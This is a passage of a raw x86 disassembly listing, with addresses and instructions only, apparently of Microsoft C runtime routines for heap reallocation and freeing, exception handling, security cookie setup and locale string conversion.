  426ffd:	cmp    ecx,DWORD PTR [edx+0x8]
  427000:	jne    0x42705e
  427002:	cmp    edi,0x20
  427005:	mov    ebx,0x80000000
  42700a:	jge    0x427032
  42700c:	mov    ecx,edi
  42700e:	shr    ebx,cl
  427010:	mov    ecx,DWORD PTR [ebp-0x4]
  427013:	lea    edi,[eax+edi*1+0x4]
  427017:	not    ebx
  427019:	mov    DWORD PTR [ebp-0x14],ebx
  42701c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  427020:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  427024:	dec    BYTE PTR [edi]
  427026:	jne    0x42705b
  427028:	mov    ecx,DWORD PTR [ebp-0x14]
  42702b:	mov    ebx,DWORD PTR [ebp+0x8]
  42702e:	and    DWORD PTR [ebx],ecx
  427030:	jmp    0x42705e
  427032:	lea    ecx,[edi-0x20]
  427035:	shr    ebx,cl
  427037:	mov    ecx,DWORD PTR [ebp-0x4]
  42703a:	lea    ecx,[eax+ecx*4+0xc4]
  427041:	lea    edi,[eax+edi*1+0x4]
  427045:	not    ebx
  427047:	and    DWORD PTR [ecx],ebx
  427049:	dec    BYTE PTR [edi]
  42704b:	mov    DWORD PTR [ebp-0x14],ebx
  42704e:	jne    0x42705b
  427050:	mov    ebx,DWORD PTR [ebp+0x8]
  427053:	mov    ecx,DWORD PTR [ebp-0x14]
  427056:	and    DWORD PTR [ebx+0x4],ecx
  427059:	jmp    0x42705e
  42705b:	mov    ebx,DWORD PTR [ebp+0x8]
  42705e:	cmp    DWORD PTR [ebp-0x8],0x0
  427062:	mov    ecx,DWORD PTR [edx+0x8]
  427065:	mov    edi,DWORD PTR [edx+0x4]
  427068:	mov    DWORD PTR [ecx+0x4],edi
  42706b:	mov    ecx,DWORD PTR [edx+0x4]
  42706e:	mov    edi,DWORD PTR [edx+0x8]
  427071:	mov    DWORD PTR [ecx+0x8],edi
  427074:	je     0x427107
  42707a:	mov    ecx,DWORD PTR [ebp-0xc]
  42707d:	lea    ecx,[ecx+esi*8]
  427080:	mov    edi,DWORD PTR [ecx+0x4]
  427083:	mov    DWORD PTR [edx+0x8],ecx
  427086:	mov    DWORD PTR [edx+0x4],edi
  427089:	mov    DWORD PTR [ecx+0x4],edx
  42708c:	mov    ecx,DWORD PTR [edx+0x4]
  42708f:	mov    DWORD PTR [ecx+0x8],edx
  427092:	mov    ecx,DWORD PTR [edx+0x4]
  427095:	cmp    ecx,DWORD PTR [edx+0x8]
  427098:	jne    0x4270f8
  42709a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42709e:	mov    BYTE PTR [ebp+0xb],cl
  4270a1:	inc    cl
  4270a3:	cmp    esi,0x20
  4270a6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4270aa:	jge    0x4270cf
  4270ac:	cmp    BYTE PTR [ebp+0xb],0x0
  4270b0:	jne    0x4270bd
  4270b2:	mov    edi,0x80000000
  4270b7:	mov    ecx,esi
  4270b9:	shr    edi,cl
  4270bb:	or     DWORD PTR [ebx],edi
  4270bd:	mov    ecx,esi
  4270bf:	mov    edi,0x80000000
  4270c4:	shr    edi,cl
  4270c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4270cd:	jmp    0x4270f8
  4270cf:	cmp    BYTE PTR [ebp+0xb],0x0
  4270d3:	jne    0x4270e2
  4270d5:	lea    ecx,[esi-0x20]
  4270d8:	mov    edi,0x80000000
  4270dd:	shr    edi,cl
  4270df:	or     DWORD PTR [ebx+0x4],edi
  4270e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4270e5:	lea    edi,[eax+ecx*4+0xc4]
  4270ec:	lea    ecx,[esi-0x20]
  4270ef:	mov    esi,0x80000000
  4270f4:	shr    esi,cl
  4270f6:	or     DWORD PTR [edi],esi
  4270f8:	mov    ecx,DWORD PTR [ebp-0x8]
  4270fb:	test   ecx,ecx
  4270fd:	je     0x42710a
  4270ff:	mov    DWORD PTR [edx],ecx
  427101:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  427105:	jmp    0x42710a
  427107:	mov    ecx,DWORD PTR [ebp-0x8]
  42710a:	mov    esi,DWORD PTR [ebp-0x10]
  42710d:	add    edx,ecx
  42710f:	lea    ecx,[esi+0x1]
  427112:	mov    DWORD PTR [edx],ecx
  427114:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  427118:	mov    esi,DWORD PTR [ebp-0xc]
  42711b:	mov    ecx,DWORD PTR [esi]
  42711d:	test   ecx,ecx
  42711f:	lea    edi,[ecx+0x1]
  427122:	mov    DWORD PTR [esi],edi
  427124:	jne    0x427140
  427126:	cmp    ebx,DWORD PTR ds:0x4674b8
  42712c:	jne    0x427140
  42712e:	mov    ecx,DWORD PTR [ebp-0x4]
  427131:	cmp    ecx,DWORD PTR ds:0x4674d0
  427137:	jne    0x427140
  427139:	and    DWORD PTR ds:0x4674b8,0x0
  427140:	mov    ecx,DWORD PTR [ebp-0x4]
  427143:	mov    DWORD PTR [eax],ecx
  427145:	lea    eax,[edx+0x4]
  427148:	pop    edi
  427149:	pop    esi
  42714a:	pop    ebx
  42714b:	leave  
  42714c:	ret    
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	push   esi
  427151:	inc    ebx
  427152:	xor    dh,BYTE PTR [eax]
  427154:	pop    eax
  427155:	inc    ebx
  427156:	xor    BYTE PTR [eax],dh
  427158:	push   ebp
  427159:	mov    ebp,esp
  42715b:	sub    esp,0x8
  42715e:	push   ebx
  42715f:	push   esi
  427160:	push   edi
  427161:	push   ebp
  427162:	cld    
  427163:	mov    ebx,DWORD PTR [ebp+0xc]
  427166:	mov    eax,DWORD PTR [ebp+0x8]
  427169:	test   DWORD PTR [eax+0x4],0x6
  427170:	jne    0x4271f8
  427176:	mov    DWORD PTR [ebp-0x8],eax
  427179:	mov    eax,DWORD PTR [ebp+0x10]
  42717c:	mov    DWORD PTR [ebp-0x4],eax
  42717f:	lea    eax,[ebp-0x8]
  427182:	mov    DWORD PTR [ebx-0x4],eax
  427185:	mov    esi,DWORD PTR [ebx+0xc]
  427188:	mov    edi,DWORD PTR [ebx+0x8]
  42718b:	cmp    esi,0xffffffff
  42718e:	je     0x4271f1
  427190:	lea    ecx,[esi+esi*2]
  427193:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427198:	je     0x4271df
  42719a:	push   esi
  42719b:	push   ebp
  42719c:	lea    ebp,[ebx+0x10]
  42719f:	call   DWORD PTR [edi+ecx*4+0x4]
  4271a3:	pop    ebp
  4271a4:	pop    esi
  4271a5:	mov    ebx,DWORD PTR [ebp+0xc]
  4271a8:	or     eax,eax
  4271aa:	je     0x4271df
  4271ac:	js     0x4271ea
  4271ae:	mov    edi,DWORD PTR [ebx+0x8]
  4271b1:	push   ebx
  4271b2:	call   0x4280e0
  4271b7:	add    esp,0x4
  4271ba:	lea    ebp,[ebx+0x10]
  4271bd:	push   esi
  4271be:	push   ebx
  4271bf:	call   0x428122
  4271c4:	add    esp,0x8
  4271c7:	lea    ecx,[esi+esi*2]
  4271ca:	push   0x1
  4271cc:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4271d0:	call   0x4281b6
  4271d5:	mov    eax,DWORD PTR [edi+ecx*4]
  4271d8:	mov    DWORD PTR [ebx+0xc],eax
  4271db:	call   DWORD PTR [edi+ecx*4+0x8]
  4271df:	mov    edi,DWORD PTR [ebx+0x8]
  4271e2:	lea    ecx,[esi+esi*2]
  4271e5:	mov    esi,DWORD PTR [edi+ecx*4]
  4271e8:	jmp    0x42718b
  4271ea:	mov    eax,0x0
  4271ef:	jmp    0x42720d
  4271f1:	mov    eax,0x1
  4271f6:	jmp    0x42720d
  4271f8:	push   ebp
  4271f9:	lea    ebp,[ebx+0x10]
  4271fc:	push   0xffffffff
  4271fe:	push   ebx
  4271ff:	call   0x428122
  427204:	add    esp,0x8
  427207:	pop    ebp
  427208:	mov    eax,0x1
  42720d:	pop    ebp
  42720e:	pop    edi
  42720f:	pop    esi
  427210:	pop    ebx
  427211:	mov    esp,ebp
  427213:	pop    ebp
  427214:	ret    
  427215:	push   ebp
  427216:	mov    ecx,DWORD PTR [esp+0x8]
  42721a:	mov    ebp,DWORD PTR [ecx]
  42721c:	mov    eax,DWORD PTR [ecx+0x1c]
  42721f:	push   eax
  427220:	mov    eax,DWORD PTR [ecx+0x18]
  427223:	push   eax
  427224:	call   0x428122
  427229:	add    esp,0x8
  42722c:	pop    ebp
  42722d:	ret    0x4
  427230:	call   0x425145
  427235:	add    eax,0x8
  427238:	ret    
  427239:	push   0x14
  42723b:	push   0x4297c8
  427240:	call   0x425290
  427245:	mov    edi,DWORD PTR [ebp+0x8]
  427248:	xor    ebx,ebx
  42724a:	cmp    edi,ebx
  42724c:	jne    0x42725c
  42724e:	push   DWORD PTR [ebp+0xc]
  427251:	call   0x425fb2
  427256:	pop    ecx
  427257:	jmp    0x4273e0
  42725c:	mov    esi,DWORD PTR [ebp+0xc]
  42725f:	cmp    esi,ebx
  427261:	jne    0x42726f
  427263:	push   edi
  427264:	call   0x425e9a
  427269:	pop    ecx
  42726a:	jmp    0x4273de
  42726f:	cmp    DWORD PTR ds:0x467704,0x3
  427276:	jne    0x4273aa
  42727c:	mov    DWORD PTR [ebp-0x1c],ebx
  42727f:	cmp    esi,0xffffffe0
  427282:	ja     0x427379
  427288:	push   0x4
  42728a:	call   0x42544f
  42728f:	pop    ecx
  427290:	mov    DWORD PTR [ebp-0x4],ebx
  427293:	push   edi
  427294:	call   0x426672
  427299:	pop    ecx
  42729a:	mov    DWORD PTR [ebp-0x20],eax
  42729d:	cmp    eax,ebx
  42729f:	je     0x427349
  4272a5:	cmp    esi,DWORD PTR ds:0x4674c4
  4272ab:	ja     0x4272f9
  4272ad:	push   esi
  4272ae:	push   edi
  4272af:	push   eax
  4272b0:	call   0x426b72
  4272b5:	add    esp,0xc
  4272b8:	test   eax,eax
  4272ba:	je     0x4272c1
  4272bc:	mov    DWORD PTR [ebp-0x1c],edi
  4272bf:	jmp    0x4272f9
  4272c1:	push   esi
  4272c2:	call   0x426e51
  4272c7:	pop    ecx
  4272c8:	mov    DWORD PTR [ebp-0x1c],eax
  4272cb:	cmp    eax,ebx
  4272cd:	je     0x4272f9
  4272cf:	mov    eax,DWORD PTR [edi-0x4]
  4272d2:	dec    eax
  4272d3:	mov    DWORD PTR [ebp-0x24],eax
  4272d6:	cmp    eax,esi
  4272d8:	jb     0x4272dc
  4272da:	mov    eax,esi
  4272dc:	push   eax
  4272dd:	push   edi
  4272de:	push   DWORD PTR [ebp-0x1c]
  4272e1:	call   0x425fd0
  4272e6:	push   edi
  4272e7:	call   0x426672
  4272ec:	mov    DWORD PTR [ebp-0x20],eax
  4272ef:	push   edi
  4272f0:	push   eax
  4272f1:	call   0x42669d
  4272f6:	add    esp,0x18
  4272f9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4272fc:	jne    0x427349
  4272fe:	cmp    esi,ebx
  427300:	jne    0x427308
  427302:	xor    esi,esi
  427304:	inc    esi
  427305:	mov    DWORD PTR [ebp+0xc],esi
  427308:	add    esi,0xf
  42730b:	and    esi,0xfffffff0
  42730e:	mov    DWORD PTR [ebp+0xc],esi
  427311:	push   esi
  427312:	push   ebx
  427313:	push   DWORD PTR ds:0x467700
  427319:	call   DWORD PTR ds:0x4290dc
  42731f:	mov    DWORD PTR [ebp-0x1c],eax
  427322:	cmp    eax,ebx
  427324:	je     0x427349
  427326:	mov    eax,DWORD PTR [edi-0x4]
  427329:	dec    eax
  42732a:	mov    DWORD PTR [ebp-0x24],eax
  42732d:	cmp    eax,esi
  42732f:	jb     0x427333
  427331:	mov    eax,esi
  427333:	push   eax
  427334:	push   edi
  427335:	push   DWORD PTR [ebp-0x1c]
  427338:	call   0x425fd0
  42733d:	push   edi
  42733e:	push   DWORD PTR [ebp-0x20]
  427341:	call   0x42669d
  427346:	add    esp,0x14
  427349:	or     DWORD PTR [ebp-0x4],0xffffffff
  42734d:	call   0x4273a1
  427352:	cmp    DWORD PTR [ebp-0x20],ebx
  427355:	jne    0x427379
  427357:	cmp    esi,ebx
  427359:	jne    0x42735e
  42735b:	xor    esi,esi
  42735d:	inc    esi
  42735e:	add    esi,0xf
  427361:	and    esi,0xfffffff0
  427364:	mov    DWORD PTR [ebp+0xc],esi
  427367:	push   esi
  427368:	push   edi
  427369:	push   ebx
  42736a:	push   DWORD PTR ds:0x467700
  427370:	call   DWORD PTR ds:0x4290e8
  427376:	mov    DWORD PTR [ebp-0x1c],eax
  427379:	mov    eax,DWORD PTR [ebp-0x1c]
  42737c:	cmp    eax,ebx
  42737e:	jne    0x4273e0
  427380:	cmp    DWORD PTR ds:0x467388,ebx
  427386:	je     0x4273e0
  427388:	push   esi
  427389:	call   0x427b72
  42738e:	pop    ecx
  42738f:	test   eax,eax
  427391:	jne    0x42727c
  427397:	jmp    0x4273de
  427399:	xor    ebx,ebx
  42739b:	mov    esi,DWORD PTR [ebp+0xc]
  42739e:	mov    edi,DWORD PTR [ebp+0x8]
  4273a1:	push   0x4
  4273a3:	call   0x4253bb
  4273a8:	pop    ecx
  4273a9:	ret    
  4273aa:	xor    eax,eax
  4273ac:	cmp    esi,0xffffffe0
  4273af:	ja     0x4273c7
  4273b1:	cmp    esi,ebx
  4273b3:	jne    0x4273b8
  4273b5:	xor    esi,esi
  4273b7:	inc    esi
  4273b8:	push   esi
  4273b9:	push   edi
  4273ba:	push   ebx
  4273bb:	push   DWORD PTR ds:0x467700
  4273c1:	call   DWORD PTR ds:0x4290e8
  4273c7:	cmp    eax,ebx
  4273c9:	jne    0x4273e0
  4273cb:	cmp    DWORD PTR ds:0x467388,ebx
  4273d1:	je     0x4273e0
  4273d3:	push   esi
  4273d4:	call   0x427b72
  4273d9:	pop    ecx
  4273da:	test   eax,eax
  4273dc:	jne    0x4273aa
  4273de:	xor    eax,eax
  4273e0:	call   0x4252cb
  4273e5:	ret    
  4273e6:	push   0x10
  4273e8:	push   0x4297d8
  4273ed:	call   0x425290
  4273f2:	cmp    DWORD PTR ds:0x467704,0x3
  4273f9:	jne    0x427435
  4273fb:	push   0x4
  4273fd:	call   0x42544f
  427402:	pop    ecx
  427403:	and    DWORD PTR [ebp-0x4],0x0
  427407:	mov    esi,DWORD PTR [ebp+0x8]
  42740a:	push   esi
  42740b:	call   0x426672
  427410:	pop    ecx
  427411:	mov    DWORD PTR [ebp-0x1c],eax
  427414:	test   eax,eax
  427416:	je     0x427423
  427418:	mov    esi,DWORD PTR [esi-0x4]
  42741b:	sub    esi,0x9
  42741e:	mov    DWORD PTR [ebp-0x20],esi
  427421:	jmp    0x427426
  427423:	mov    esi,DWORD PTR [ebp-0x20]
  427426:	or     DWORD PTR [ebp-0x4],0xffffffff
  42742a:	call   0x427453
  42742f:	cmp    DWORD PTR [ebp-0x1c],0x0
  427433:	jne    0x427448
  427435:	push   DWORD PTR [ebp+0x8]
  427438:	push   0x0
  42743a:	push   DWORD PTR ds:0x467700
  427440:	call   DWORD PTR ds:0x4290ec
  427446:	mov    esi,eax
  427448:	mov    eax,esi
  42744a:	call   0x4252cb
  42744f:	ret    
  427450:	mov    esi,DWORD PTR [ebp-0x20]
  427453:	push   0x4
  427455:	call   0x4253bb
  42745a:	pop    ecx
  42745b:	ret    
  42745c:	push   ebp
  42745d:	mov    ebp,esp
  42745f:	sub    esp,0x10
  427462:	push   esi
  427463:	lea    eax,[ebp-0x8]
  427466:	push   eax
  427467:	call   DWORD PTR ds:0x4290fc
  42746d:	mov    esi,DWORD PTR [ebp-0x4]
  427470:	xor    esi,DWORD PTR [ebp-0x8]
  427473:	call   DWORD PTR ds:0x4290f8
  427479:	xor    esi,eax
  42747b:	call   DWORD PTR ds:0x4290b4
  427481:	xor    esi,eax
  427483:	call   DWORD PTR ds:0x4290f4
  427489:	xor    esi,eax
  42748b:	lea    eax,[ebp-0x10]
  42748e:	push   eax
  42748f:	call   DWORD PTR ds:0x4290f0
  427495:	mov    eax,DWORD PTR [ebp-0xc]
  427498:	xor    eax,DWORD PTR [ebp-0x10]
  42749b:	xor    esi,eax
  42749d:	mov    DWORD PTR ds:0x4669f0,esi
  4274a3:	jne    0x4274af
  4274a5:	mov    DWORD PTR ds:0x4669f0,0xbb40e64e
  4274af:	pop    esi
  4274b0:	leave  
  4274b1:	ret    
  4274b2:	push   0x118
  4274b7:	push   0x429988
  4274bc:	call   0x425290
  4274c1:	mov    eax,ds:0x4669f0
  4274c6:	xor    eax,DWORD PTR [ebp+0x4]
  4274c9:	mov    DWORD PTR [ebp-0x1c],eax
  4274cc:	mov    eax,ds:0x467358
  4274d1:	xor    ecx,ecx
  4274d3:	cmp    eax,ecx
  4274d5:	je     0x4274f6
  4274d7:	mov    DWORD PTR [ebp-0x4],ecx
  4274da:	push   DWORD PTR [ebp+0xc]
  4274dd:	push   DWORD PTR [ebp+0x8]
  4274e0:	call   eax
  4274e2:	pop    ecx
  4274e3:	pop    ecx
  4274e4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274e8:	jmp    0x4275f4
  4274ed:	xor    eax,eax
  4274ef:	inc    eax
  4274f0:	ret    
  4274f1:	mov    esp,DWORD PTR [ebp-0x18]
  4274f4:	jmp    0x4274e4
  4274f6:	mov    eax,DWORD PTR [ebp+0x8]
  4274f9:	dec    eax
  4274fa:	je     0x42750f
  4274fc:	mov    edi,0x429964
  427501:	mov    DWORD PTR [ebp-0x20],0x4298b0
  427508:	mov    esi,0xd4
  42750d:	jmp    0x427520
  42750f:	mov    edi,0x429890
  427514:	mov    DWORD PTR [ebp-0x20],0x4297f0
  42751b:	mov    esi,0xb9
  427520:	mov    BYTE PTR [ebp-0x24],cl
  427523:	push   0x104
  427528:	lea    eax,[ebp-0x128]
  42752e:	push   eax
  42752f:	push   ecx
  427530:	call   DWORD PTR ds:0x429084
  427536:	test   eax,eax
  427538:	jne    0x42754d
  42753a:	push   0x4294e4
  42753f:	lea    eax,[ebp-0x128]
  427545:	push   eax
  427546:	call   0x425670
  42754b:	pop    ecx
  42754c:	pop    ecx
  42754d:	lea    ebx,[ebp-0x128]
  427553:	lea    eax,[ebp-0x128]
  427559:	push   eax
  42755a:	call   0x4258a0
  42755f:	pop    ecx
  427560:	add    eax,0xb
  427563:	cmp    eax,0x3c
  427566:	jbe    0x427591
  427568:	lea    eax,[ebp-0x128]
  42756e:	push   eax
  42756f:	call   0x4258a0
  427574:	mov    ebx,eax
  427576:	lea    eax,[ebp-0x128]
  42757c:	sub    eax,0x31
  42757f:	add    ebx,eax
  427581:	push   0x3
  427583:	push   0x4294e0
  427588:	push   ebx
  427589:	call   0x425770
  42758e:	add    esp,0x10
  427591:	push   ebx
  427592:	call   0x4258a0
  427597:	pop    ecx
  427598:	lea    eax,[eax+esi*1+0xc]
  42759c:	add    eax,0x3
  42759f:	and    eax,0xfffffffc
  4275a2:	call   0x4252e0
  4275a7:	mov    DWORD PTR [ebp-0x18],esp
  4275aa:	mov    esi,esp
  4275ac:	push   edi
  4275ad:	push   esi
  4275ae:	call   0x425670
  4275b3:	mov    edi,0x4294c0
  4275b8:	push   edi
  4275b9:	push   esi
  4275ba:	call   0x425680
  4275bf:	push   0x4297e4
  4275c4:	push   esi
  4275c5:	call   0x425680
  4275ca:	push   ebx
  4275cb:	push   esi
  4275cc:	call   0x425680
  4275d1:	push   edi
  4275d2:	push   esi
  4275d3:	call   0x425680
  4275d8:	push   DWORD PTR [ebp-0x20]
  4275db:	push   esi
  4275dc:	call   0x425680
  4275e1:	push   0x12010
  4275e6:	push   0x429498
  4275eb:	push   esi
  4275ec:	call   0x425572
  4275f1:	add    esp,0x3c
  4275f4:	push   0x3
  4275f6:	call   0x4246fe
  4275fb:	int3   
  4275fc:	push   0x38
  4275fe:	push   0x429da8
  427603:	call   0x425290
  427608:	xor    ebx,ebx
  42760a:	cmp    DWORD PTR ds:0x46737c,ebx
  427610:	jne    0x42764a
  427612:	push   ebx
  427613:	push   ebx
  427614:	xor    esi,esi
  427616:	inc    esi
  427617:	push   esi
  427618:	push   0x429da4
  42761d:	push   0x100
  427622:	push   ebx
  427623:	call   DWORD PTR ds:0x429108
  427629:	test   eax,eax
  42762b:	je     0x427635
  42762d:	mov    DWORD PTR ds:0x46737c,esi
  427633:	jmp    0x42764a
  427635:	call   DWORD PTR ds:0x429034
  42763b:	cmp    eax,0x78
  42763e:	jne    0x42764a
  427640:	mov    DWORD PTR ds:0x46737c,0x2
  42764a:	cmp    DWORD PTR [ebp+0x14],ebx
  42764d:	jle    0x42766a
  42764f:	mov    ecx,DWORD PTR [ebp+0x14]
  427652:	mov    eax,DWORD PTR [ebp+0x10]
  427655:	dec    ecx
  427656:	cmp    BYTE PTR [eax],bl
  427658:	je     0x427662
  42765a:	inc    eax
  42765b:	cmp    ecx,ebx
  42765d:	jne    0x427655
  42765f:	or     ecx,0xffffffff
  427662:	or     eax,0xffffffff
  427665:	sub    eax,ecx
  427667:	add    DWORD PTR [ebp+0x14],eax
  42766a:	mov    eax,ds:0x46737c
  42766f:	cmp    eax,0x2
  427672:	je     0x427854
  427678:	cmp    eax,ebx
  42767a:	je     0x427854
  427680:	cmp    eax,0x1
  427683:	jne    0x427887
  427689:	xor    edi,edi
  42768b:	mov    DWORD PTR [ebp-0x1c],edi
  42768e:	mov    DWORD PTR [ebp-0x20],ebx
  427691:	mov    DWORD PTR [ebp-0x24],ebx
  427694:	cmp    DWORD PTR [ebp+0x20],ebx
  427697:	jne    0x4276a1
  427699:	mov    eax,ds:0x467374
  42769e:	mov    DWORD PTR [ebp+0x20],eax
  4276a1:	push   ebx
  4276a2:	push   ebx
  4276a3:	push   DWORD PTR [ebp+0x14]
  4276a6:	push   DWORD PTR [ebp+0x10]
  4276a9:	xor    eax,eax
  4276ab:	cmp    DWORD PTR [ebp+0x24],ebx
  4276ae:	setne  al
  4276b1:	lea    eax,[eax*8+0x1]
  4276b8:	push   eax
  4276b9:	push   DWORD PTR [ebp+0x20]
  4276bc:	call   DWORD PTR ds:0x429104
  4276c2:	mov    esi,eax
  4276c4:	mov    DWORD PTR [ebp-0x28],esi
  4276c7:	cmp    esi,ebx
  4276c9:	je     0x427887
  4276cf:	mov    DWORD PTR [ebp-0x4],0x1
  4276d6:	lea    eax,[esi+esi*1]
  4276d9:	add    eax,0x3
  4276dc:	and    eax,0xfffffffc
  4276df:	call   0x4252e0
  4276e4:	mov    DWORD PTR [ebp-0x18],esp
  4276e7:	mov    eax,esp
  4276e9:	mov    DWORD PTR [ebp-0x2c],eax
  4276ec:	or     DWORD PTR [ebp-0x4],0xffffffff
  4276f0:	jmp    0x42770d
  4276f2:	xor    eax,eax
  4276f4:	inc    eax
  4276f5:	ret    
  4276f6:	mov    esp,DWORD PTR [ebp-0x18]
  4276f9:	call   0x428725
  4276fe:	xor    ebx,ebx
  427700:	mov    DWORD PTR [ebp-0x2c],ebx
  427703:	or     DWORD PTR [ebp-0x4],0xffffffff
  427707:	mov    edi,DWORD PTR [ebp-0x1c]
  42770a:	mov    esi,DWORD PTR [ebp-0x28]
  42770d:	cmp    DWORD PTR [ebp-0x2c],ebx
  427710:	jne    0x42772e
  427712:	lea    eax,[esi+esi*1]
  427715:	push   eax
  427716:	call   0x425fb2
  42771b:	pop    ecx
  42771c:	mov    DWORD PTR [ebp-0x2c],eax
  42771f:	cmp    eax,ebx
  427721:	je     0x427887
  427727:	mov    DWORD PTR [ebp-0x20],0x1
  42772e:	push   esi
  42772f:	push   DWORD PTR [ebp-0x2c]
  427732:	push   DWORD PTR [ebp+0x14]
  427735:	push   DWORD PTR [ebp+0x10]
  427738:	push   0x1
  42773a:	push   DWORD PTR [ebp+0x20]
  42773d:	call   DWORD PTR ds:0x429104
  427743:	test   eax,eax
  427745:	je     0x427831
  42774b:	push   ebx
  42774c:	push   ebx
  42774d:	push   esi
  42774e:	push   DWORD PTR [ebp-0x2c]
  427751:	push   DWORD PTR [ebp+0xc]
  427754:	push   DWORD PTR [ebp+0x8]
  427757:	call   DWORD PTR ds:0x429108
  42775d:	mov    edi,eax
  42775f:	mov    DWORD PTR [ebp-0x1c],edi
  427762:	cmp    edi,ebx
  427764:	je     0x427831
  42776a:	test   BYTE PTR [ebp+0xd],0x4
  42776e:	je     0x42779d
  427770:	cmp    DWORD PTR [ebp+0x1c],ebx
  427773:	je     0x427831
  427779:	cmp    edi,DWORD PTR [ebp+0x1c]
  42777c:	jg     0x427831
  427782:	push   DWORD PTR [ebp+0x1c]
  427785:	push   DWORD PTR [ebp+0x18]
  427788:	push   esi
  427789:	push   DWORD PTR [ebp-0x2c]
  42778c:	push   DWORD PTR [ebp+0xc]
  42778f:	push   DWORD PTR [ebp+0x8]
  427792:	call   DWORD PTR ds:0x429108
  427798:	jmp    0x427831
  42779d:	mov    DWORD PTR [ebp-0x4],0x2
  4277a4:	lea    eax,[edi+edi*1]
  4277a7:	add    eax,0x3
  4277aa:	and    eax,0xfffffffc
  4277ad:	call   0x4252e0
  4277b2:	mov    DWORD PTR [ebp-0x18],esp
  4277b5:	mov    eax,esp
  4277b7:	mov    DWORD PTR [ebp-0x30],eax
  4277ba:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277be:	jmp    0x4277db
  4277c0:	xor    eax,eax
  4277c2:	inc    eax
  4277c3:	ret    
  4277c4:	mov    esp,DWORD PTR [ebp-0x18]
  4277c7:	call   0x428725
  4277cc:	xor    ebx,ebx
  4277ce:	mov    DWORD PTR [ebp-0x30],ebx
  4277d1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277d5:	mov    edi,DWORD PTR [ebp-0x1c]
  4277d8:	mov    esi,DWORD PTR [ebp-0x28]
  4277db:	cmp    DWORD PTR [ebp-0x30],ebx
  4277de:	jne    0x4277f8
  4277e0:	lea    eax,[edi+edi*1]
  4277e3:	push   eax
  4277e4:	call   0x425fb2
  4277e9:	pop    ecx
  4277ea:	mov    DWORD PTR [ebp-0x30],eax
  4277ed:	cmp    eax,ebx
  4277ef:	je     0x427831
  4277f1:	mov    DWORD PTR [ebp-0x24],0x1
  4277f8:	push   edi
  4277f9:	push   DWORD PTR [ebp-0x30]
  4277fc:	push   esi
  4277fd:	push   DWORD PTR [ebp-0x2c]
  427800:	push   DWORD PTR [ebp+0xc]
  427803:	push   DWORD PTR [ebp+0x8]
  427806:	call   DWORD PTR ds:0x429108
  42780c:	test   eax,eax
  42780e:	je     0x427831
  427810:	push   ebx
  427811:	push   ebx
  427812:	cmp    DWORD PTR [ebp+0x1c],ebx
  427815:	jne    0x42781b
  427817:	push   ebx
  427818:	push   ebx
  427819:	jmp    0x427821
  42781b:	push   DWORD PTR [ebp+0x1c]
  42781e:	push   DWORD PTR [ebp+0x18]
  427821:	push   edi
  427822:	push   DWORD PTR [ebp-0x30]
  427825:	push   ebx
  427826:	push   DWORD PTR [ebp+0x20]
  427829:	call   DWORD PTR ds:0x429098
  42782f:	mov    edi,eax
  427831:	cmp    DWORD PTR [ebp-0x24],ebx
  427834:	je     0x42783f
  427836:	push   DWORD PTR [ebp-0x30]
  427839:	call   0x425e9a
  42783e:	pop    ecx
  42783f:	cmp    DWORD PTR [ebp-0x20],ebx
  427842:	je     0x42784d
  427844:	push   DWORD PTR [ebp-0x2c]
  427847:	call   0x425e9a
  42784c:	pop    ecx
  42784d:	mov    eax,edi
  42784f:	jmp    0x4279af
  427854:	mov    DWORD PTR [ebp-0x34],ebx
  427857:	xor    edi,edi
  427859:	mov    DWORD PTR [ebp-0x38],ebx
  42785c:	cmp    DWORD PTR [ebp+0x8],ebx
  42785f:	jne    0x427869
  427861:	mov    eax,ds:0x467364
  427866:	mov    DWORD PTR [ebp+0x8],eax
  427869:	cmp    DWORD PTR [ebp+0x20],ebx
  42786c:	jne    0x427876
  42786e:	mov    eax,ds:0x467374
  427873:	mov    DWORD PTR [ebp+0x20],eax
  427876:	push   DWORD PTR [ebp+0x8]
  427879:	call   0x42850d
  42787e:	pop    ecx
  42787f:	mov    DWORD PTR [ebp-0x3c],eax
  427882:	cmp    eax,0xffffffff
  427885:	jne    0x42788e
  427887:	xor    eax,eax
  427889:	jmp    0x4279af
  42788e:	cmp    eax,DWORD PTR [ebp+0x20]
  427891:	je     0x427985
  427897:	push   ebx
  427898:	push   ebx
  427899:	lea    ecx,[ebp+0x14]
  42789c:	push   ecx
  42789d:	push   DWORD PTR [ebp+0x10]
  4278a0:	push   eax
  4278a1:	push   DWORD PTR [ebp+0x20]
  4278a4:	call   0x428556
  4278a9:	add    esp,0x18
  4278ac:	mov    DWORD PTR [ebp-0x34],eax
  4278af:	cmp    eax,ebx
  4278b1:	je     0x427887
  4278b3:	push   ebx
  4278b4:	push   ebx
  4278b5:	push   DWORD PTR [ebp+0x14]
  4278b8:	push   eax
  4278b9:	push   DWORD PTR [ebp+0xc]
  4278bc:	push   DWORD PTR [ebp+0x8]
  4278bf:	call   DWORD PTR ds:0x429100
  4278c5:	mov    esi,eax
  4278c7:	mov    DWORD PTR [ebp-0x40],esi
  4278ca:	cmp    esi,ebx
  4278cc:	je     0x427974
  4278d2:	mov    DWORD PTR [ebp-0x4],ebx
  4278d5:	add    eax,0x3
  4278d8:	and    eax,0xfffffffc
  4278db:	call   0x4252e0
  4278e0:	mov    DWORD PTR [ebp-0x18],esp
  4278e3:	mov    edi,esp
  4278e5:	mov    DWORD PTR [ebp-0x44],edi
  4278e8:	push   esi
  4278e9:	push   ebx
  4278ea:	push   edi
  4278eb:	call   0x427b90
  4278f0:	add    esp,0xc
  4278f3:	jmp    0x427905
  4278f5:	xor    eax,eax
  4278f7:	inc    eax
  4278f8:	ret    
  4278f9:	mov    esp,DWORD PTR [ebp-0x18]
